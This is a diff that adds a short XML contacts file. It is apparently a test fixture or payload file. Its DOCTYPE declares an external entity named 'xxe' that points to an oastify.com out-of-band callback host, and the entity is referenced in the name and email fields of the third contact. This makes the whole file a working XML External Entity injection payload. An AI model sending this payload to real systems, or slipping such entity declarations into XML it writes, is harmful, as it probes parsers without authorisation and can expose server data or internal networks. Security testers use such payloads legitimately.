@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="/contact.xsl"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "https://tb8i115wbzztnuysiqa2ivbufllcb07ow.oastify.com" >]>
+<contacts>
+    <contact>
+        <name>ben</name>
+        <email>ben@test.com</email>
+    </contact>
+    <contact>
+        <name>adam</name>
+        <email>adam@test.com</email>
+    </contact>
+    <contact>
+        <name>&xxe;</name>
+        <email>&xxe;</email>
+    </contact>
+</contacts>
